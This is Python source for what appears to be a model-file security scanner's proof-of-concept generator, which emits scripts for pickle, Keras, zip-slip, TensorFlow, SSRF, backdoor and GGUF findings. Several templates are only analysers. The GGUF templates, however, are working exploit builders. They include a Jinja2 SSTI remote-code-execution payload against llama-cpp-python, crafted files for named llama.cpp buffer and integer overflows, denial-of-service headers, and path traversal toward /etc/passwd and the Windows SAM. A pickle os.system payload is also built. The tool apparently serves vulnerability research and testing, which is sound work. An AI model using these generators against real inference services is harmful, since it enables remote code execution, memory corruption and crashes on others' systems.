"""PoC (Proof of Concept) generator for detected exploit payloads.

Generates scripts that demonstrate how detected malicious payloads exploit
vulnerabilities in parsers/loaders/runtimes. 

IMPORTANT TERMINOLOGY:
- The MODEL FILES contain exploit payloads (crafted malicious data)
- The PARSERS/LOADERS have vulnerabilities (bugs that payloads exploit)
- PoCs demonstrate how payloads trigger parser vulnerabilities

Examples:
- GGUF file with n_dims=255 → exploits CVE-2024-21802 in llama.cpp
- Pickle file with os.system → exploits pickle.load() deserialization
- Keras file with Lambda layer → exploits CVE-2024-3660 in load_model()
"""

import json
import os
from datetime import datetime
from typing import Any, Dict, List, Optional

from ..scanners.base_scanner import Vulnerability


class PoCGenerator:
    """Generates Proof of Concept files for vulnerabilities."""
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        """Initialize the PoC generator."""
        self.config = config or {}
        self.poc_config = self.config.get("poc", {})
        self.include_warnings = self.poc_config.get("include_safety_warnings", True)
        self.formats = self.poc_config.get("formats", ["python", "json"])
    
    def generate_all(self, vulnerabilities: List[Vulnerability], output_dir: str) -> List[str]:
        """Generate PoC files for all vulnerabilities."""
        os.makedirs(output_dir, exist_ok=True)
        generated_files = []
        
        for vuln in vulnerabilities:
            files = self.generate_poc(vuln, output_dir)
            generated_files.extend(files)
        
        return generated_files
    
    def generate_poc(self, vuln: Vulnerability, output_dir: str) -> List[str]:
        """Generate PoC files for a single vulnerability."""
        generated = []
        base_name = f"{vuln.id}_{self._sanitize_filename(vuln.vulnerability_type)}"
        
        if "python" in self.formats:
            py_path = os.path.join(output_dir, f"{base_name}.py")
            self._generate_python_poc(vuln, py_path)
            generated.append(py_path)
        
        if "json" in self.formats:
            json_path = os.path.join(output_dir, f"{base_name}.json")
            self._generate_json_poc(vuln, json_path)
            generated.append(json_path)
        
        return generated
    
    def _generate_python_poc(self, vuln: Vulnerability, output_path: str):
        """Generate a Python PoC script."""
        poc_content = self._get_python_poc_template(vuln)
        with open(output_path, "w", encoding="utf-8") as f:
            f.write(poc_content)
    
    def _generate_json_poc(self, vuln: Vulnerability, output_path: str):
        """Generate a JSON PoC document."""
        # Extract target runtime from evidence if available
        target_runtime = vuln.evidence.get("target_runtime") or vuln.evidence.get("target_parser") or "Unknown"
        
        poc_data = {
            "vulnerability_id": vuln.id,
            "vulnerability_type": vuln.vulnerability_type,
            "severity": vuln.severity.to_dict() if hasattr(vuln.severity, "to_dict") else str(vuln.severity),
            "description": vuln.description,
            "exploit_mechanism": {
                "payload_location": "Model file contains crafted malicious data",
                "target_vulnerability": target_runtime,
                "trigger": "Vulnerability triggered when target parser/loader processes the file",
            },
            "location": vuln.location,
            "evidence": vuln.evidence,
            "reproduction_steps": self._get_reproduction_steps(vuln),
            "expected_behavior": self._get_expected_behavior(vuln),
            "mitigation": vuln.recommendation,
            "references": vuln.references,
            "generated_at": datetime.utcnow().isoformat() + "Z",
        }
        with open(output_path, "w", encoding="utf-8") as f:
            json.dump(poc_data, f, indent=2, default=str)
    
    def _get_python_poc_template(self, vuln: Vulnerability) -> str:
        """Get Python PoC template for exploit payload type."""
        warning = ""
        if self.include_warnings:
            warning = '''"""
WARNING: This is a Proof of Concept for educational purposes only.
DO NOT run this on production systems.
Run only in an isolated sandbox environment.

This PoC demonstrates how the detected EXPLOIT PAYLOAD in the model file
triggers a VULNERABILITY in the parser/loader/runtime.

- The model FILE contains malicious data (exploit payload)
- The PARSER/LOADER has the vulnerability (bug being exploited)
"""

'''
        
        vuln_type = vuln.vulnerability_type.lower()
        
        if "pickle" in vuln_type:
            return warning + self._get_pickle_poc(vuln)
        elif "lambda" in vuln_type or "keras" in vuln_type:
            return warning + self._get_lambda_layer_poc(vuln)
        elif "zip" in vuln_type or "slip" in vuln_type:
            return warning + self._get_zip_slip_poc(vuln)
        elif "graph" in vuln_type or "tensorflow" in vuln_type:
            return warning + self._get_graph_injection_poc(vuln)
        elif "gguf" in vuln_type:
            return warning + self._get_gguf_poc(vuln)
        elif "external" in vuln_type or "ssrf" in vuln_type:
            return warning + self._get_ssrf_poc(vuln)
        elif "backdoor" in vuln_type:
            return warning + self._get_backdoor_poc(vuln)
        else:
            return warning + self._get_generic_poc(vuln)
    
    def _get_pickle_poc(self, vuln: Vulnerability) -> str:
        """Generate pickle exploit payload PoC."""
        file_path = vuln.location.get("file", "malicious.pkl")
        return f'''#!/usr/bin/env python3
"""
Pickle Exploit Payload PoC
Vulnerability ID: {vuln.id}
File: {file_path}
Description: {vuln.description}

EXPLOIT MECHANISM:
- The pickle FILE contains a malicious __reduce__ payload
- Python's pickle.load() has the vulnerability (executes embedded code)
- When pickle.load() deserializes this file, it runs the payload
"""

import pickle
import pickletools
import io

def analyze_pickle(file_path):
    """Analyze pickle file without loading it."""
    with open(file_path, "rb") as f:
        data = f.read()
    print("=== Pickle Opcodes ===")
    pickletools.dis(io.BytesIO(data))

def demonstrate_vulnerability():
    """FOR EDUCATIONAL PURPOSES ONLY."""
    import os
    class MaliciousPickle:
        def __reduce__(self):
            return (os.system, ('whoami',))
    payload = pickle.dumps(MaliciousPickle())
    print("Malicious pickle bytes:", payload.hex())

if __name__ == "__main__":
    print("Pickle Vulnerability PoC")
    print("=" * 50)
    try:
        analyze_pickle("{file_path}")
    except Exception as e:
        print(f"Analysis failed: {{e}}")
'''

    def _get_lambda_layer_poc(self, vuln: Vulnerability) -> str:
        """Generate Lambda layer exploit payload PoC."""
        file_path = vuln.location.get("file", "model.keras")
        return f'''#!/usr/bin/env python3
"""
Keras Lambda Layer Exploit Payload PoC
Vulnerability ID: {vuln.id}
File: {file_path}
Description: {vuln.description}

EXPLOIT MECHANISM:
- The Keras model FILE contains a Lambda layer with malicious code
- keras.models.load_model() has the vulnerability (CVE-2024-3660)
- When load_model() processes this file, it executes the Lambda code
"""

import json
import zipfile
import base64

def analyze_keras_model(file_path):
    """Analyze Keras model config without loading it."""
    with zipfile.ZipFile(file_path, "r") as zf:
        for name in zf.namelist():
            if name.endswith("config.json"):
                config = json.loads(zf.read(name))
                print(f"Config file: {{name}}")
                find_lambda_layers(config)

def find_lambda_layers(config, path=""):
    """Recursively find Lambda layers."""
    if isinstance(config, dict):
        if config.get("class_name") == "Lambda":
            print(f"Found Lambda layer at: {{path}}")
        for key, value in config.items():
            find_lambda_layers(value, f"{{path}}.{{key}}")
    elif isinstance(config, list):
        for i, item in enumerate(config):
            find_lambda_layers(item, f"{{path}}[{{i}}]")

if __name__ == "__main__":
    print("Lambda Layer Vulnerability PoC")
    print("=" * 50)
    try:
        analyze_keras_model("{file_path}")
    except Exception as e:
        print(f"Analysis failed: {{e}}")
    print("\\nMitigation: Use safe_mode=True when loading Keras models")
'''

    def _get_zip_slip_poc(self, vuln: Vulnerability) -> str:
        """Generate Zip Slip PoC."""
        file_path = vuln.location.get("file", "model.zip")
        return f'''#!/usr/bin/env python3
"""
Zip Slip Path Traversal PoC
Vulnerability ID: {vuln.id}
File: {file_path}
Description: {vuln.description}
"""

import zipfile
import os

def analyze_archive(file_path):
    """Check for path traversal in archive."""
    with zipfile.ZipFile(file_path, "r") as zf:
        print("Archive contents:")
        for name in zf.namelist():
            if ".." in name or name.startswith("/"):
                print(f"  [DANGEROUS] {{name}}")
            else:
                print(f"  [OK] {{name}}")

def safe_extract(archive_path, dest_dir):
    """Safely extract archive with path validation."""
    os.makedirs(dest_dir, exist_ok=True)
    real_dest = os.path.realpath(dest_dir)
    with zipfile.ZipFile(archive_path, "r") as zf:
        for member in zf.namelist():
            member_path = os.path.normpath(member)
            if member_path.startswith("..") or os.path.isabs(member_path):
                print(f"Skipping dangerous path: {{member}}")
                continue
            target = os.path.join(dest_dir, member_path)
            if not os.path.realpath(target).startswith(real_dest):
                print(f"Path traversal blocked: {{member}}")
                continue
            zf.extract(member, dest_dir)

if __name__ == "__main__":
    print("Zip Slip Vulnerability PoC")
    print("=" * 50)
    try:
        analyze_archive("{file_path}")
    except Exception as e:
        print(f"Analysis failed: {{e}}")
'''

    def _get_graph_injection_poc(self, vuln: Vulnerability) -> str:
        """Generate TensorFlow graph injection PoC."""
        return f'''#!/usr/bin/env python3
"""
TensorFlow Graph Injection PoC
Vulnerability ID: {vuln.id}
Description: {vuln.description}
"""

DANGEROUS_OPS = ["PyFunc", "PyFuncStateless", "EagerPyFunc", "ReadFile", "WriteFile"]

def analyze_savedmodel(model_dir):
    """Analyze SavedModel for dangerous ops."""
    import tensorflow as tf
    graph_def = tf.compat.v1.GraphDef()
    with open(f"{{model_dir}}/saved_model.pb", "rb") as f:
        graph_def.ParseFromString(f.read())
    for node in graph_def.node:
        status = "[DANGEROUS]" if node.op in DANGEROUS_OPS else "[OK]"
        print(f"  {{status}} {{node.name}}: {{node.op}}")

if __name__ == "__main__":
    print("TensorFlow Graph Injection PoC")
    print("=" * 50)
    print("Run untrusted TensorFlow models in a sandbox (nsjail)")
'''

    def _get_gguf_poc(self, vuln: Vulnerability) -> str:
        """Generate GGUF exploit payload PoC that creates malicious GGUF files.
        
        These PoCs generate GGUF files containing exploit payloads that
        trigger vulnerabilities in PARSERS like llama.cpp and llama-cpp-python.
        The GGUF file is just data - the vulnerability is in the parser.
        """
        vuln_type_lower = vuln.vulnerability_type.lower()
        file_path = vuln.location.get("file", "exploit.gguf")
        
        # Determine exploit type and generate appropriate PoC
        if "ssti" in vuln_type_lower or "jinja" in vuln_type_lower:
            return self._get_gguf_ssti_poc(vuln)
        elif "dimension" in vuln_type_lower or "21802" in vuln_type_lower:
            return self._get_gguf_dimension_overflow_poc(vuln)
        elif "tensor" in vuln_type_lower and "overflow" in vuln_type_lower or "21836" in vuln_type_lower:
            return self._get_gguf_tensor_overflow_poc(vuln)
        elif "version" in vuln_type_lower or "deadbeef" in vuln_type_lower or "cafebabe" in vuln_type_lower:
            return self._get_gguf_bad_version_poc(vuln)
        elif "path" in vuln_type_lower and "traversal" in vuln_type_lower:
            return self._get_gguf_path_traversal_poc(vuln)
        elif "signed" in vuln_type_lower or "int32" in vuln_type_lower or "memcpy" in vuln_type_lower:
            return self._get_gguf_signed_overflow_poc(vuln)
        elif "dos" in vuln_type_lower or "exhaustion" in vuln_type_lower or "uint64" in vuln_type_lower:
            return self._get_gguf_dos_poc(vuln)
        else:
            return self._get_gguf_generic_poc(vuln)
    
    def _get_gguf_ssti_poc(self, vuln: Vulnerability) -> str:
        """Generate GGUF SSTI exploit payload PoC."""
        return f'''#!/usr/bin/env python3
"""
GGUF Exploit Payload Generator - Jinja2 SSTI
Vulnerability ID: {vuln.id}
Description: {vuln.description}

EXPLOIT MECHANISM:
- This script creates a GGUF FILE containing an SSTI payload in chat_template
- The PARSER (llama-cpp-python < 0.2.72) has the vulnerability (CVE-2024-34359)
- When the parser processes the template, it executes the injected Python code
- Target: llama-cpp-python's Jinja2 template rendering
"""

import struct
import os

GGUF_MAGIC = b"GGUF"
GGUF_VERSION = 3

# GGUF value types
GGUF_TYPE_STRING = 8

def write_string(data: bytes) -> bytes:
    """Write a GGUF string (length + data)."""
    return struct.pack("<Q", len(data)) + data

def write_kv_string(key: bytes, value: bytes) -> bytes:
    """Write a key-value pair with string value."""
    return write_string(key) + struct.pack("<I", GGUF_TYPE_STRING) + write_string(value)

def create_ssti_exploit(output_path: str, command: str = "id"):
    """Create a GGUF file with SSTI payload in chat template."""
    
    # Jinja2 SSTI payload for RCE - double braces are Jinja2 template syntax
    # This exploits: {{{{cycler.__init__.__globals__.os.popen('COMMAND').read()}}}}
    ssti_payload = ("{{{{" + " cycler.__init__.__globals__.os.popen('" + command + "').read() " + "}}}}").encode()
    
    # Alternative payloads (uncomment to use):
    # Method 1: Via __class__.__mro__
    # ssti_payload = b"{{{{ ''.__class__.__mro__[1].__subclasses__()[132]('whoami', shell=True, stdout=-1).communicate()[0] }}}}"
    # Method 2: Via __builtins__
    # ssti_payload = b"{{{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}}}"
    
    # Build GGUF header
    n_tensors = 0
    n_kv = 2  # tokenizer.chat_template + general.architecture
    
    header = GGUF_MAGIC
    header += struct.pack("<I", GGUF_VERSION)
    header += struct.pack("<Q", n_tensors)
    header += struct.pack("<Q", n_kv)
    
    # Key-value pairs
    kv_data = b""
    kv_data += write_kv_string(b"general.architecture", b"llama")
    kv_data += write_kv_string(b"tokenizer.chat_template", ssti_payload)
    
    # Write file
    with open(output_path, "wb") as f:
        f.write(header + kv_data)
    
    print(f"[+] Created SSTI exploit: {{output_path}}")
    print(f"[+] Payload will execute: {{command}}")
    return output_path

def analyze_existing_file(file_path: str):
    """Analyze an existing GGUF file for SSTI patterns."""
    with open(file_path, "rb") as f:
        data = f.read()
    
    ssti_patterns = [
        b"__globals__", b"__builtins__", b"__import__",
        b"os.popen", b"subprocess", b"eval(", b"exec(",
    ]
    
    print(f"Analyzing: {{file_path}}")
    for pattern in ssti_patterns:
        if pattern in data:
            offset = data.find(pattern)
            print(f"  [!] Found '{{pattern.decode()}}' at offset {{offset}}")

if __name__ == "__main__":
    print("=" * 60)
    print("GGUF Jinja2 SSTI Exploit Generator")
    print("CVE-2024-34359 - llama-cpp-python RCE")
    print("=" * 60)
    
    # Generate exploit file
    output = "exploit_ssti.gguf"
    create_ssti_exploit(output, command="whoami")
    
    print("\\n[*] To test (in vulnerable environment):")
    print("    from llama_cpp import Llama")
    print(f"    llm = Llama(model_path='{{output}}')")
    print("    llm.create_chat_completion([{{'role': 'user', 'content': 'hi'}}])")
'''
    
    def _get_gguf_dimension_overflow_poc(self, vuln: Vulnerability) -> str:
        """Generate GGUF dimension overflow exploit payload PoC (CVE-2024-21802)."""
        return f'''#!/usr/bin/env python3
"""
GGUF Exploit Payload Generator - Tensor Dimension Overflow
Vulnerability ID: {vuln.id}
Description: {vuln.description}

EXPLOIT MECHANISM:
- This script creates a GGUF FILE with n_dims > GGML_MAX_DIMS (4)
- The PARSER (llama.cpp) has the vulnerability (CVE-2024-21802)
- When llama.cpp reads this file, it writes past the ggml_tensor.ne buffer
- Result: heap buffer overflow → potential code execution or crash
- Target: llama.cpp GGUF tensor info parsing
"""

import struct

GGUF_MAGIC = b"GGUF"
GGUF_VERSION = 3
GGUF_TYPE_STRING = 8
GGUF_TYPE_UINT32 = 4

# GGML tensor types
GGML_TYPE_F32 = 0

def write_string(data: bytes) -> bytes:
    return struct.pack("<Q", len(data)) + data

def write_kv_string(key: bytes, value: bytes) -> bytes:
    return write_string(key) + struct.pack("<I", GGUF_TYPE_STRING) + write_string(value)

def create_dimension_overflow_exploit(output_path: str, n_dims: int = 255):
    """Create GGUF with tensor having excessive dimensions (CVE-2024-21802)."""
    
    # Header
    n_tensors = 1
    n_kv = 1
    
    header = GGUF_MAGIC
    header += struct.pack("<I", GGUF_VERSION)
    header += struct.pack("<Q", n_tensors)
    header += struct.pack("<Q", n_kv)
    
    # KV pairs
    kv_data = write_kv_string(b"general.architecture", b"exploit")
    
    # Tensor info with overflow dimensions
    tensor_name = b"overflow_tensor"
    tensor_info = write_string(tensor_name)
    tensor_info += struct.pack("<I", n_dims)  # n_dims = 255 (max is 4!)
    
    # Add dimensions (this will overflow the fixed-size dims[4] array)
    for i in range(n_dims):
        tensor_info += struct.pack("<Q", 0x4141414141414141)  # Overflow data
    
    tensor_info += struct.pack("<I", GGML_TYPE_F32)  # type
    tensor_info += struct.pack("<Q", 0)  # offset
    
    with open(output_path, "wb") as f:
        f.write(header + kv_data + tensor_info)
    
    print(f"[+] Created CVE-2024-21802 exploit: {{output_path}}")
    print(f"[+] Tensor dimensions set to: {{n_dims}} (max allowed: 4)")
    return output_path

if __name__ == "__main__":
    print("=" * 60)
    print("GGUF Dimension Overflow Exploit Generator")
    print("CVE-2024-21802 - Buffer Overflow via n_dims")
    print("=" * 60)
    
    create_dimension_overflow_exploit("exploit_dims_overflow.gguf", n_dims=255)
    
    print("\\n[*] Impact: Buffer overflow when parsing tensor info")
    print("[*] Affected: llama.cpp versions before fix")
'''
    
    def _get_gguf_tensor_overflow_poc(self, vuln: Vulnerability) -> str:
        """Generate GGUF tensor count overflow exploit PoC (CVE-2024-21836)."""
        return f'''#!/usr/bin/env python3
"""
GGUF Tensor Count Integer Overflow Exploit Generator
Vulnerability ID: {vuln.id}
CVE: CVE-2024-21836
Description: {vuln.description}

This exploit sets n_tensors to a huge value causing integer overflow
during memory allocation calculations.
"""

import struct

GGUF_MAGIC = b"GGUF"
GGUF_VERSION = 3

def create_tensor_overflow_exploit(output_path: str):
    """Create GGUF with integer overflow in tensor count."""
    
    # Exploit value that causes overflow: size = n_tensors * sizeof(tensor_info)
    # 0x1D1D1D1D1D1D1D1D * 48 = overflow
    n_tensors_overflow = 0x1D1D1D1D1D1D1D1D
    n_kv = 0
    
    header = GGUF_MAGIC
    header += struct.pack("<I", GGUF_VERSION)
    header += struct.pack("<Q", n_tensors_overflow)  # Overflow value
    header += struct.pack("<Q", n_kv)
    
    with open(output_path, "wb") as f:
        f.write(header)
    
    print(f"[+] Created CVE-2024-21836 exploit: {{output_path}}")
    print(f"[+] n_tensors = 0x{{n_tensors_overflow:016X}}")
    return output_path

if __name__ == "__main__":
    print("=" * 60)
    print("GGUF Tensor Count Overflow Exploit Generator")
    print("CVE-2024-21836 - Integer Overflow in Memory Allocation")
    print("=" * 60)
    
    create_tensor_overflow_exploit("exploit_tensor_overflow.gguf")
    
    print("\\n[*] Impact: Integer overflow -> heap corruption")
'''
    
    def _get_gguf_bad_version_poc(self, vuln: Vulnerability) -> str:
        """Generate GGUF bad version exploit PoC."""
        return f'''#!/usr/bin/env python3
"""
GGUF Version Field Corruption Exploit Generator
Vulnerability ID: {vuln.id}
Description: {vuln.description}

Creates GGUF with corrupt version field containing exploit markers.
"""

import struct

GGUF_MAGIC = b"GGUF"

def create_bad_version_exploit(output_path: str, version_value: int = 0xDEADBEEF):
    """Create GGUF with corrupted version field."""
    
    header = GGUF_MAGIC
    header += struct.pack("<I", version_value)  # Corrupt version
    header += struct.pack("<Q", 0)  # n_tensors
    header += struct.pack("<Q", 0)  # n_kv
    
    with open(output_path, "wb") as f:
        f.write(header)
    
    print(f"[+] Created bad version exploit: {{output_path}}")
    print(f"[+] Version set to: 0x{{version_value:08X}}")
    return output_path

if __name__ == "__main__":
    print("=" * 60)
    print("GGUF Bad Version Exploit Generator")
    print("=" * 60)
    
    create_bad_version_exploit("exploit_deadbeef.gguf", 0xDEADBEEF)
    create_bad_version_exploit("exploit_cafebabe.gguf", 0xCAFEBABE)
'''
    
    def _get_gguf_path_traversal_poc(self, vuln: Vulnerability) -> str:
        """Generate GGUF path traversal exploit PoC."""
        return f'''#!/usr/bin/env python3
"""
GGUF Path Traversal Exploit Generator
Vulnerability ID: {vuln.id}
Description: {vuln.description}

Creates GGUF with path traversal patterns in metadata.
"""

import struct

GGUF_MAGIC = b"GGUF"
GGUF_VERSION = 3
GGUF_TYPE_STRING = 8

def write_string(data: bytes) -> bytes:
    return struct.pack("<Q", len(data)) + data

def write_kv_string(key: bytes, value: bytes) -> bytes:
    return write_string(key) + struct.pack("<I", GGUF_TYPE_STRING) + write_string(value)

def create_path_traversal_exploit(output_path: str, target_path: str = "/etc/passwd"):
    """Create GGUF with path traversal in metadata."""
    
    header = GGUF_MAGIC
    header += struct.pack("<I", GGUF_VERSION)
    header += struct.pack("<Q", 0)  # n_tensors
    header += struct.pack("<Q", 2)  # n_kv
    
    kv_data = b""
    kv_data += write_kv_string(b"general.architecture", b"exploit")
    kv_data += write_kv_string(b"model.path", target_path.encode())
    
    with open(output_path, "wb") as f:
        f.write(header + kv_data)
    
    print(f"[+] Created path traversal exploit: {{output_path}}")
    print(f"[+] Target path: {{target_path}}")
    return output_path

if __name__ == "__main__":
    print("=" * 60)
    print("GGUF Path Traversal Exploit Generator")
    print("=" * 60)
    
    create_path_traversal_exploit("exploit_path_traversal.gguf", "../../../etc/passwd")
    create_path_traversal_exploit("exploit_windows_traversal.gguf", "..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam")
'''
    
    def _get_gguf_signed_overflow_poc(self, vuln: Vulnerability) -> str:
        """Generate GGUF signed/unsigned conversion exploit PoC."""
        return f'''#!/usr/bin/env python3
"""
GGUF Signed/Unsigned Conversion Exploit Generator
Vulnerability ID: {vuln.id}
Description: {vuln.description}

Creates GGUF with INT32_MAX+1 value to exploit signed/unsigned conversions.
"""

import struct

GGUF_MAGIC = b"GGUF"
GGUF_VERSION = 3
GGUF_TYPE_STRING = 8

def write_string_with_length(length: int, data: bytes) -> bytes:
    """Write string with custom length field (for exploit)."""
    return struct.pack("<Q", length) + data

def create_signed_overflow_exploit(output_path: str):
    """Create GGUF exploiting INT32_MAX + 1 signed conversion bug."""
    
    # INT32_MAX + 1 = 0x80000000 = 2147483648
    # When cast to signed int32, this becomes -2147483648
    exploit_length = 0x80000001  # INT32_MAX + 2
    
    header = GGUF_MAGIC
    header += struct.pack("<I", GGUF_VERSION)
    header += struct.pack("<Q", 0)  # n_tensors
    header += struct.pack("<Q", 1)  # n_kv
    
    # KV with exploited length
    kv_data = write_string_with_length(exploit_length, b"x" * 8)  # Key with overflow length
    kv_data += struct.pack("<I", GGUF_TYPE_STRING)
    kv_data += struct.pack("<Q", 4) + b"test"
    
    with open(output_path, "wb") as f:
        f.write(header + kv_data)
    
    print(f"[+] Created signed overflow exploit: {{output_path}}")
    print(f"[+] Length field: 0x{{exploit_length:08X}} (triggers memcpy bug)")
    return output_path

if __name__ == "__main__":
    print("=" * 60)
    print("GGUF Signed/Unsigned Conversion Exploit Generator")
    print("Token memcpy signed conversion vulnerability")
    print("=" * 60)
    
    create_signed_overflow_exploit("exploit_signed_overflow.gguf")
'''
    
    def _get_gguf_dos_poc(self, vuln: Vulnerability) -> str:
        """Generate GGUF DoS exploit PoC."""
        return f'''#!/usr/bin/env python3
"""
GGUF Denial of Service Exploit Generator
Vulnerability ID: {vuln.id}
Description: {vuln.description}

Creates GGUF with values designed to exhaust memory/CPU.
"""

import struct

GGUF_MAGIC = b"GGUF"
GGUF_VERSION = 3

def create_dos_exploit(output_path: str, dos_type: str = "kv_exhaustion"):
    """Create GGUF DoS exploit."""
    
    if dos_type == "kv_exhaustion":
        # Max uint64 for n_kv causes huge allocation
        n_kv = 0xFFFFFFFFFFFFFFFF
        n_tensors = 0
    elif dos_type == "tensor_exhaustion":
        n_kv = 0
        n_tensors = 0xFFFFFFFFFFFFFFFF
    else:
        n_kv = 0xFFFFFFFFFFFFFFFF
        n_tensors = 0xFFFFFFFFFFFFFFFF
    
    header = GGUF_MAGIC
    header += struct.pack("<I", GGUF_VERSION)
    header += struct.pack("<Q", n_tensors)
    header += struct.pack("<Q", n_kv)
    
    with open(output_path, "wb") as f:
        f.write(header)
    
    print(f"[+] Created DoS exploit: {{output_path}}")
    print(f"[+] n_tensors = 0x{{n_tensors:016X}}")
    print(f"[+] n_kv = 0x{{n_kv:016X}}")
    return output_path

if __name__ == "__main__":
    print("=" * 60)
    print("GGUF Denial of Service Exploit Generator")
    print("=" * 60)
    
    create_dos_exploit("exploit_dos_kv.gguf", "kv_exhaustion")
    create_dos_exploit("exploit_dos_tensors.gguf", "tensor_exhaustion")
    
    print("\\n[*] Impact: Memory exhaustion, application crash")
'''
    
    def _get_gguf_generic_poc(self, vuln: Vulnerability) -> str:
        """Generate generic GGUF PoC with all exploit types."""
        file_path = vuln.location.get("file", "exploit.gguf")
        return f'''#!/usr/bin/env python3
"""
GGUF Format Vulnerability PoC
Vulnerability ID: {vuln.id}
Description: {vuln.description}
Original File: {file_path}
"""

import struct
import os

GGUF_MAGIC = b"GGUF"
GGUF_VERSION = 3
GGUF_TYPE_STRING = 8

def write_string(data: bytes) -> bytes:
    return struct.pack("<Q", len(data)) + data

def write_kv_string(key: bytes, value: bytes) -> bytes:
    return write_string(key) + struct.pack("<I", GGUF_TYPE_STRING) + write_string(value)

def analyze_gguf(file_path: str):
    """Analyze GGUF file for vulnerabilities."""
    with open(file_path, "rb") as f:
        magic = f.read(4)
        if magic != GGUF_MAGIC:
            print(f"[!] Invalid magic: {{magic}}")
            return
        
        version = struct.unpack("<I", f.read(4))[0]
        n_tensors = struct.unpack("<Q", f.read(8))[0]
        n_kv = struct.unpack("<Q", f.read(8))[0]
        
        print(f"Version: {{version}}")
        print(f"Tensors: {{n_tensors}} (0x{{n_tensors:016X}})")
        print(f"KV pairs: {{n_kv}} (0x{{n_kv:016X}})")
        
        # Check for exploit indicators
        if version in [0xDEADBEEF, 0xCAFEBABE]:
            print("[!] EXPLOIT: Bad version marker detected")
        if n_tensors > 0x7FFFFFFF or n_kv > 0x7FFFFFFF:
            print("[!] EXPLOIT: Integer overflow values detected")

def create_minimal_exploit(output_path: str):
    """Create minimal valid GGUF with exploitable structure."""
    header = GGUF_MAGIC
    header += struct.pack("<I", GGUF_VERSION)
    header += struct.pack("<Q", 0)
    header += struct.pack("<Q", 1)
    
    kv = write_kv_string(b"general.architecture", b"exploit")
    
    with open(output_path, "wb") as f:
        f.write(header + kv)
    
    print(f"[+] Created: {{output_path}}")

if __name__ == "__main__":
    print("=" * 60)
    print("GGUF Vulnerability Analysis & Exploit Generator")
    print("=" * 60)
    
    # Analyze original file if exists
    original = "{file_path}"
    if os.path.exists(original):
        print(f"\\nAnalyzing original: {{original}}")
        analyze_gguf(original)
    
    # Create exploit
    print("\\nGenerating exploit...")
    create_minimal_exploit("exploit_generated.gguf")
'''

    def _get_ssrf_poc(self, vuln: Vulnerability) -> str:
        """Generate SSRF/external reference PoC."""
        urls = vuln.evidence.get("ssrf_urls", []) or vuln.evidence.get("sample_urls", [])
        return f'''#!/usr/bin/env python3
"""
External Reference / SSRF Vulnerability PoC
Vulnerability ID: {vuln.id}
Description: {vuln.description}
"""

SUSPICIOUS_URLS = {urls}

def check_ssrf_indicators(url):
    """Check if URL indicates SSRF attempt."""
    from urllib.parse import urlparse
    parsed = urlparse(url)
    hostname = parsed.netloc.lower()
    indicators = ["localhost", "127.0.0.1", "169.254.169.254", "metadata.google.internal"]
    for ind in indicators:
        if ind in hostname:
            return True, ind
    return False, None

if __name__ == "__main__":
    print("External Reference / SSRF PoC")
    print("=" * 50)
    for url in SUSPICIOUS_URLS[:10]:
        is_ssrf, indicator = check_ssrf_indicators(url)
        status = f"[SSRF] ({{indicator}})" if is_ssrf else "[EXTERNAL]"
        print(f"{{status}} {{url}}")
'''

    def _get_backdoor_poc(self, vuln: Vulnerability) -> str:
        """Generate neural backdoor PoC."""
        return f'''#!/usr/bin/env python3
"""
Neural Backdoor Detection PoC
Vulnerability ID: {vuln.id}
Description: {vuln.description}
"""

import numpy as np

def analyze_weight_distribution(weights):
    """Analyze weight distribution for backdoor indicators."""
    mean, std = np.mean(weights), np.std(weights)
    z_scores = np.abs((weights - mean) / std)
    outlier_ratio = np.sum(z_scores > 3) / len(weights)
    print(f"Mean: {{mean:.6f}}, Std: {{std:.6f}}, Outlier ratio: {{outlier_ratio:.4f}}")
    if outlier_ratio > 0.01:
        print("[WARNING] High outlier ratio may indicate backdoor")

if __name__ == "__main__":
    print("Neural Backdoor Detection PoC")
    print("=" * 50)
    print("Use specialized tools: Neural Cleanse, ABS, DeepInspect")
'''

    def _get_generic_poc(self, vuln: Vulnerability) -> str:
        """Generate generic PoC."""
        return f'''#!/usr/bin/env python3
"""
Vulnerability PoC
ID: {vuln.id}
Type: {vuln.vulnerability_type}
Description: {vuln.description}
"""

VULN_ID = "{vuln.id}"
VULN_TYPE = "{vuln.vulnerability_type}"
SEVERITY = "{vuln.severity.level if hasattr(vuln.severity, 'level') else vuln.severity}"
RECOMMENDATION = """{vuln.recommendation}"""

if __name__ == "__main__":
    print(f"Vulnerability: {{VULN_TYPE}}")
    print(f"Severity: {{SEVERITY}}")
    print("Recommendation:", RECOMMENDATION)
'''

    def _get_reproduction_steps(self, vuln: Vulnerability) -> List[str]:
        """Get reproduction steps for a vulnerability."""
        vuln_type = vuln.vulnerability_type.lower()
        if "pickle" in vuln_type:
            return ["Analyze pickle opcodes with pickletools", "Identify REDUCE/GLOBAL opcodes", "Loading executes embedded code"]
        elif "lambda" in vuln_type:
            return ["Extract config.json from Keras ZIP", "Find Lambda layer definitions", "Loading executes Lambda code"]
        elif "zip" in vuln_type:
            return ["List archive contents", "Identify '../' paths", "Extraction overwrites files"]
        return ["Analyze model structure", "Identify vulnerable component", "Loading triggers vulnerability"]
    
    def _get_expected_behavior(self, vuln: Vulnerability) -> str:
        """Get expected malicious behavior."""
        vuln_type = vuln.vulnerability_type.lower()
        if "pickle" in vuln_type or "lambda" in vuln_type:
            return "Arbitrary code execution"
        elif "zip" in vuln_type:
            return "Arbitrary file overwrite"
        elif "ssrf" in vuln_type:
            return "Server-side request forgery"
        return "Depends on vulnerability type"
    
    def _sanitize_filename(self, name: str) -> str:
        """Sanitize a string for use in filename."""
        invalid = '<>:"/\\|?*'
        result = name
        for char in invalid:
            result = result.replace(char, "_")
        result = result.replace(" ", "_").replace("-", "_")
        result = "_".join(part for part in result.split("_") if part)
        return result[:50]
